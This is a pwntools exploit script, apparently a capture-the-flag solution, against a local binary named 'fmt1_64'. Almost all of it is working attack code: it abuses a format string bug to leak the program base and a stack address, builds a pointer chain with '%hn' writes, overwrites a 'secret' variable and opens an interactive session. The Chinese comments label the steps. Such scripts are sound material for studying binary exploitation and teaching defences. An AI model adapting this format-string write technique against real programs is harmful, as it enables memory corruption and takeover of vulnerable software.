from pwn import *		
from LibcSearcher import *
context(log_level='debug',os='linux',arch='amd64')
pwnfile  = './fmt1_64'# './fmt1_64'
io=process(pwnfile)
elf = ELF(pwnfile)

def debug(x=0):
	gdb.attach(io,x)
	pause()

def cmd(x):
	io.recvuntil(">>")
	io.sendline(str(x))
def fmt(pay):
	cmd(2)
	yes = raw_input()			# 调试时read可能把后续发送的数据接受掉
	io.sendline(pay)
def leak(adr):					# 读取任意地址内容
	cmd(1)
	io.send(adr)

secret_offset = 0x0202060	

io.recvuntil("tell me the time:")
io.sendline(b'1')
io.sendline(b'1')
io.sendline(b'1')

#  elf_adr
fmt("%7$hhn,%17$p")
io.recvuntil(",")
main_adr = int(io.recv(14),16)-118
elf_base = main_adr - 0xfb6

secret_adr = secret_offset + elf_base

#  stack_adr
fmt("%7$hhn,%16$p")
io.recvuntil(",")
leak = int(io.recv(14),16)
rbp_adr = leak - 0x30
log.success("rbp_adr--->"+hex(rbp_adr))




#  构造三链
target_adr = (leak+2)
pay = b'%7$hhn,%'+str((target_adr&0xffff)-1).encode("utf-8")+b'c%25$hn'
fmt(pay)


# 低2字节

pay = b'%7$hhn,%'+str((secret_adr&0xffff)-1).encode("utf-8")+b'c%16$hn'
fmt(pay)

# 16 ~ 24


target_B = (secret_adr&0xff0000)>>16
print("target_B--->",hex(target_B))
print("secret_adr--->",hex(secret_adr))

#debug("b *$rebase(0x0ECC)")

pay = b'%7$hhn,%'+str(target_B-1).encode("utf-8")+b'c%51$hhn'
fmt(pay)

sleep(0.2)
pay = b'%'+str((0x100)).encode("utf-8")+b'c%22$hn,'
fmt(pay)

#debug("b *$rebase(0x0F2B)")
cmd(3)
sleep(0.2)
pay = b'\x00'*0x50
io.send(pay)

io.interactive()

